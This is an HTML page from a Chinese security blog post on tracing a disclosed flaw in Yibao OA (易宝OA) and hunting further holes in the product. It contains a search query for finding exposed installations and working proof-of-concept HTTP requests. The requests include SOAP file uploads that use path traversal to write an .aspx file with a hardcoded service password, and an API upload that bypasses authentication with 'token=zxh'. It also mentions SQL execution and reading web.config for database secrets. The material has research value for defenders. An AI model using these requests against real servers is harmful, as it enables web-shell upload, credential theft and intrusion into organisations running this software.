@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="如何快速分析1day漏洞并挖掘0day不需要特别强的代码审计能力，快速根据1day细节追踪并分析代码，在此基础上尝试挖掘其他接口漏洞甚至0day漏洞。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="易宝OA">
+<meta property="og:url" content="http://example.com/2024/04/11/%E6%98%93%E5%AE%9DOA/index.html">
+<meta property="og:site_name" content="Y0ng的博客">
+<meta property="og:description" content="如何快速分析1day漏洞并挖掘0day不需要特别强的代码审计能力，快速根据1day细节追踪并分析代码，在此基础上尝试挖掘其他接口漏洞甚至0day漏洞。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240329182351932.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240329182407103.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240329185227497.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327175317594.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327175354245.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327180512206.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327180805125.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327181842740.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327182324302.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327215614715.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327222032463.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327183030758.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327190137909.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327190543108.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327190609458.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327191753221.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327213608792.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327222601696.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327222312213.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327223514374.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327223822545.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327224818570.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327230518277.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327231333160.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327232443295.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327232517848.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327234058143.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327234157062.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327234553458.png">
+<meta property="article:published_time" content="2024-04-11T01:16:08.018Z">
+<meta property="article:modified_time" content="2024-04-11T01:17:19.797Z">
+<meta property="article:author" content="Y0ng">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240329182351932.png">
+
+<link rel="canonical" href="http://example.com/2024/04/11/%E6%98%93%E5%AE%9DOA/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>易宝OA | Y0ng的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Y0ng的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">14</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">108</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/04/11/%E6%98%93%E5%AE%9DOA/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cys.jpg">
+      <meta itemprop="name" content="Y0ng">
+      <meta itemprop="description" content="花有重开日，人无再少年">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          易宝OA
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-04-11 09:16:08 / 修改时间：09:17:19" itemprop="dateCreated datePublished" datetime="2024-04-11T09:16:08+08:00">2024-04-11</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="如何快速分析1day漏洞并挖掘0day"><a href="#如何快速分析1day漏洞并挖掘0day" class="headerlink" title="如何快速分析1day漏洞并挖掘0day"></a>如何快速分析1day漏洞并挖掘0day</h1><p>不需要特别强的代码审计能力，快速根据1day细节追踪并分析代码，在此基础上尝试挖掘其他接口漏洞甚至0day漏洞。</p>
+<a id="more"></a>
+
+<h1 id="获取0-1day漏洞"><a href="#获取0-1day漏洞" class="headerlink" title="获取0/1day漏洞"></a>获取0/1day漏洞</h1><p>可通过公众号等手段获取漏洞信息，以下以易宝OA为例</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240329182351932.png" alt="image-20240329182351932"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240329182407103.png" alt="image-20240329182407103"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">web.title&#x3D;&quot;欢迎登录易宝OA系统 &amp;&amp; &quot;banner&#x3D;&quot;易宝OA&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="细节提取"><a href="#细节提取" class="headerlink" title="细节提取"></a>细节提取</h2><p>根据放出的图片，提取到 <code>SOAPAction&quot;: &quot;http://tempuri.org/UploadBillFile</code> 、xml数据格式、.net，目录穿越</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240329185227497.png" alt="image-20240329185227497"></p>
+<h2 id="历史漏洞搜索"><a href="#历史漏洞搜索" class="headerlink" title="历史漏洞搜索"></a>历史漏洞搜索</h2><p>通过文库，github，公众号等搜索相关历史漏洞，例如这里搜索 “易宝OA”，搜到相关漏洞都是文件上传</p>
+<p>第一个：</p>
+<p>提取信息：UploadPersonalFile、/WebService/BasicService.asmx、soap</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327175317594.png" alt="image-20240327175317594"></p>
+<p>第二个：</p>
+<p>提取信息：/api/files/UploadFile</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327175354245.png" alt="image-20240327175354245"></p>
+<h1 id="源码获取"><a href="#源码获取" class="headerlink" title="源码获取"></a>源码获取</h1><p>搜索引擎-&gt;历史漏洞-&gt;获取源码，推荐yakit快速筛选出目标</p>
+<p>如何打包？一条命令就搞定</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rar：</span><br><span class="line">rar.exe a -m3 -r manager.rar manager</span><br><span class="line"></span><br><span class="line">7z：</span><br><span class="line">7z.exe a manager.7z manager &quot;-xr!log&#x2F;&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="环境搭建与分析"><a href="#环境搭建与分析" class="headerlink" title="环境搭建与分析"></a>环境搭建与分析</h1><p>php-&gt;vscode、java-&gt;IDEA、.net/c#-&gt;dnspy</p>
+<p>快速分析目录结构，全部点一点，分辨出哪些是静态资源，哪些是逻辑源码</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327180512206.png" alt="image-20240327180512206"></p>
+<p>有问题就问chatgpt</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327180805125.png" alt="image-20240327180805125"></p>
+<p>这里有几个文件，大概意思就是指定交付给后端的哪块代码处理。</p>
+<p>Global.asax，大概是运行的是TopVision.WebApi这个东西web应用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%@ Application Codebehind&#x3D;&quot;Global.asax.cs&quot; Inherits&#x3D;&quot;TopVision.WebApi.WebApiApplication&quot; Language&#x3D;&quot;C#&quot; %&gt;</span><br></pre></td></tr></table></figure>
+
+<p>WebService\BasicService.asmx，漏洞文件，运行TopVision.WebApi.WebService.BasicService</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%@ WebService Language&#x3D;&quot;C#&quot; CodeBehind&#x3D;&quot;BasicService.asmx.cs&quot; Class&#x3D;&quot;TopVision.WebApi.WebService.BasicService&quot; %&gt;</span><br></pre></td></tr></table></figure>
+
+<p>WebService\Gateway.asmx，运行TopVision.WebApi.WebService.Gateway</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%@ WebService Language&#x3D;&quot;C#&quot; CodeBehind&#x3D;&quot;Gateway.asmx.cs&quot; Class&#x3D;&quot;TopVision.WebApi.WebService.Gateway&quot; %&gt;</span><br></pre></td></tr></table></figure>
+
+<p>.net主要的代码逻辑都在bin目录下的dll，导入到dnspy分析即可。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327181842740.png" alt="image-20240327181842740"></p>
+<ul>
+<li>core-核心代码</li>
+<li>framework-框架</li>
+<li>tookit-工具相关?</li>
+<li>web-web代码</li>
+<li>webapi-api接口代码</li>
+</ul>
+<p>快速挖洞肯定首选web代码与api接口。</p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>翻译翻译就能找到重点，重点就是找，config、setting、service、routes之类的</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327182324302.png" alt="image-20240327182324302"></p>
+<h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><p>根据代码结构肯定先看ToVision.WebApi了</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327215614715.png" alt="image-20240327215614715"></p>
+<p>一些filter，session等，主要还是看config和application</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327222032463.png" alt="image-20240327222032463"></p>
+<h1 id="分析历史漏洞"><a href="#分析历史漏洞" class="headerlink" title="分析历史漏洞"></a>分析历史漏洞</h1><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><p>首先看到settings，漏洞url就出现了，setting-url-service三者结合初步推测代码实现的功能：<code>凡是访问/WebService/BasicService.asmx的都交由Topvision_Web_ERPService_BasicService该服务进行处理</code></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327183030758.png" alt="image-20240327183030758"></p>
+<p>但是与前面分析的矛盾，不是应该交由 <code>TopVision.WebApi.WebService.BasicService</code> 来处理吗？</p>
+<p>看看chatgpt的回答</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327190137909.png" alt="image-20240327190137909"></p>
+<p>概括为：WebService\BasicService.asmx只是定义了最终交由 <code>TopVision.WebApi.WebService.BasicService</code> 处理，中间过程可以通过settings配置交由 <code>Topvision_Web_ERPService_BasicService</code> 处理。</p>
+<p>分别看一下二者的漏洞函数 <code>UploadPersonalFile</code> 的实现</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327190543108.png" alt="image-20240327190543108"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327190609458.png" alt="image-20240327190609458"></p>
+<p>果然，前者通过soap发送到后者，然后写入文件，需要三个参数fs文件内容，filename文件名称，webservicePassword密钥</p>
+<p>全局搜一下即可，这里注意XML文件中有很多webservicePassword，下面要用到。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327191753221.png" alt="image-20240327191753221"></p>
+<p>poc构造，soap的实现可以根据源码问chatgpt</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;WebService&#x2F;BasicService.asmx HTTP&#x2F;1.1</span><br><span class="line">Host: xxxx:8056</span><br><span class="line">SOAPAction: http:&#x2F;&#x2F;tempuri.org&#x2F;UploadPersonalFile</span><br><span class="line">Content-Type: text&#x2F;xml; charset&#x3D;utf-8</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot; xmlns:tem&#x3D;&quot;http:&#x2F;&#x2F;tempuri.org&#x2F;&quot;&gt;</span><br><span class="line">   &lt;soapenv:Header&#x2F;&gt;</span><br><span class="line">   &lt;soapenv:Body&gt;</span><br><span class="line">      &lt;tem:UploadPersonalFile&gt;</span><br><span class="line">         &lt;tem:fs&gt;bGR3aw&#x3D;&#x3D;&lt;&#x2F;tem:fs&gt;</span><br><span class="line">         &lt;tem:FileName&gt;..&#x2F;..&#x2F;manager&#x2F;1.aspx&lt;&#x2F;tem:FileName&gt;</span><br><span class="line">         &lt;tem:webservicePassword&gt;&#123;ac80457b-368d-4062-b2dd-ae4d490e1c4b&#125;&lt;&#x2F;tem:webservicePassword&gt;</span><br><span class="line">      &lt;&#x2F;tem:UploadPersonalFile&gt;</span><br><span class="line">   &lt;&#x2F;soapenv:Body&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Envelope&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327213608792.png" alt="image-20240327213608792"></p>
+<h2 id="API-1"><a href="#API-1" class="headerlink" title="API"></a>API</h2><p>看application，即程序初始化入口，主要是配置web api、配置过滤器、配置路由规则、加载web.config配置文件。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327222601696.png" alt="image-20240327222601696"></p>
+<p>接着config看，添加了路由，形式为：api/{controller}/{action}</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327222312213.png" alt="image-20240327222312213"></p>
+<p>那就直接找controller控制器吧，files控制器继承ToVisionApi</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327223514374.png" alt="image-20240327223514374"></p>
+<p>这里存在一个鉴权，但是只要传 <code>token=zxh</code> 即可绕过</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327223822545.png" alt="image-20240327223822545"></p>
+<p>回到上传文件，需要三个参数+token参数</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327224818570.png" alt="image-20240327224818570"></p>
+<p>另外如果传入fs的值为以下，是可以json反序列化的。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fs&#x3D;[60,37,64,80,97,103,101,32,76,97,110,103,11]</span><br></pre></td></tr></table></figure>
+
+<p>构造poc</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;api&#x2F;files&#x2F;UploadFile HTTP&#x2F;1.1</span><br><span class="line">Host: xxxx</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">token&#x3D;zxh&amp;FileName&#x3D;&#x2F;..&#x2F;..&#x2F;manager&#x2F;1.aspx&amp;pathType&#x3D;1&amp;fs&#x3D;[108,100,119,107,50]</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327230518277.png" alt="image-20240327230518277"></p>
+<h1 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h1><p>综上，快速挖洞就可以基于以上分析，从web与api进行</p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>比如UploadBillFile</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327231333160.png" alt="image-20240327231333160"></p>
+<p>poc</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;WebService&#x2F;BasicService.asmx HTTP&#x2F;1.1</span><br><span class="line">Host: xxxxx</span><br><span class="line">SOAPAction: http:&#x2F;&#x2F;tempuri.org&#x2F;UploadBillFile</span><br><span class="line">Content-Type: text&#x2F;xml; charset&#x3D;utf-8</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot; xmlns:tem&#x3D;&quot;http:&#x2F;&#x2F;tempuri.org&#x2F;&quot;&gt;</span><br><span class="line">   &lt;soapenv:Header&#x2F;&gt;</span><br><span class="line">   &lt;soapenv:Body&gt;</span><br><span class="line">      &lt;tem:UploadBillFile&gt;</span><br><span class="line">         &lt;tem:fs&gt;bGR3aw&#x3D;&#x3D;&lt;&#x2F;tem:fs&gt;</span><br><span class="line">         &lt;tem:FileName&gt;..&#x2F;..&#x2F;manager&#x2F;1.aspx&lt;&#x2F;tem:FileName&gt;</span><br><span class="line">         &lt;tem:webservicePassword&gt;&#123;ac80457b-368d-4062-b2dd-ae4d490e1c4b&#125;&lt;&#x2F;tem:webservicePassword&gt;</span><br><span class="line">      &lt;&#x2F;tem:UploadBillFile&gt;</span><br><span class="line">   &lt;&#x2F;soapenv:Body&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Envelope&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>执行sql</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327232443295.png" alt="image-20240327232443295"></p>
+<p>任意文件下载</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327232517848.png" alt="image-20240327232517848"></p>
+<h2 id="API-2"><a href="#API-2" class="headerlink" title="API"></a>API</h2><p>文件上传四个接口</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327234058143.png" alt="image-20240327234058143"></p>
+<p>任意文件读取，读web.config，泄露数据库，webservicepassword等信息</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327234157062.png" alt="image-20240327234157062"></p>
+<p>还有一些其他的接口</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327234553458.png" alt="image-20240327234553458"></p>
+<p>太多了就不一一举例了。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/03/27/adminer/" rel="prev" title="记adminer.php一次利用">
+      <i class="fa fa-chevron-left"></i> 记adminer.php一次利用
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
